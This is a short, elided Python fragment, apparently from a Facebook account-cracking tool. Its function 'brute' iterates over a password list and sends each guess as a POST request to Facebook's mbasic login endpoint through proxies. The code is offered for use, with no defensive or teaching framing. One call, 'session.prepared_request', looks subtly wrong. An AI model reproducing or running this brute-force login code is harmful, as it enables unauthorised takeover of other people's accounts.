...
def brute(uid,pwx):
	...
	try:
		for pw in pwx:
			...
			pep = Request(method='POST',
				url='https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',
				headers=pentil,
				data=ngentot
				)
			prepped = session.prepared_request(pep)
			settings = session.merge_environment_settings(prepped.url,proxies=proxy)
			peppek = session.send(prepped,**settings)
